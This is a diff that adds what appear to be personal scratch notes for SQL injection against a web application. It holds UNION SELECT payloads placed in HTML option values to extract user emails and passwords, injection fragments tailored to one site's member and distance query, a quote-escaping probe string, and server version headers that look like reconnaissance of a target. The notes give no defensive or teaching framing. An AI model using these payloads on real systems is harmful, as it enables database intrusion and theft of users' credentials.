@@ -1,0 +1,35 @@
+SELECT 1, (SELECT CONCAT(users.email,':', users.pass) FROM ) as result, 2 FROM test;
+
+http://souptonuts.sourceforge.net/readme_sqlite_tutorial.html
+
+http://mailliststock.wordpress.com/2007/03/01/sqlite-examples-with-bash-perl-and-python/
+
+<option selected="" value="1000 UNION ALL SELECT 1 AS user FROM users WHERE 1=1">hack</option>
+
+
+<option selected="" value="1000\" UNION ALL SELECT 1 AS user FROM users WHERE 1=1">hack</option>
+
+
+1000 UNION ALL SELECT 1 AS user FROM users WHERE 1=1"
+
+<option selected="" value="1000 UNION SELECT * FROM users WHERE 1=1 --">hack</option>
+
+<option selected="" value="1000 UNION SELECT pass AS user FROM users WHERE 1=1 --">hack</option>
+
+'1000\') GROUP BY a.member,a.longitude,a.latitude,distance,b.id, b.created, b.gender, b.saluted, b.rating, b.videocount ORDER BY distance ASC
+
+/* UNION ALL SELECT password AS member FROM users LIMIT 1 -- #') GROUP BY a.member,a.longitude,a.latitude,distance,b.id, b.created, b.gender, b.saluted, b.rating, b.videocount ORDER BY distance ASC
+
+') AND (b.age >= ' ') 
+
+GROUP BY a.member,a.longitude,a.latitude,distance,b.id, b.created, b.gender, b.saluted, b.rating, b.videocount ORDER BY distance ASC
+
+xp.pe.july.2009
+
+MEMDSN
+
+	.	Server:Apache/2.2.14 (Unix) PHP/5.2.12
+	.	Vary:Accept-Encoding
+	.	X-Powered-By:PHP/5.2.12
+
+\'\"\\(0/1)'' \* --
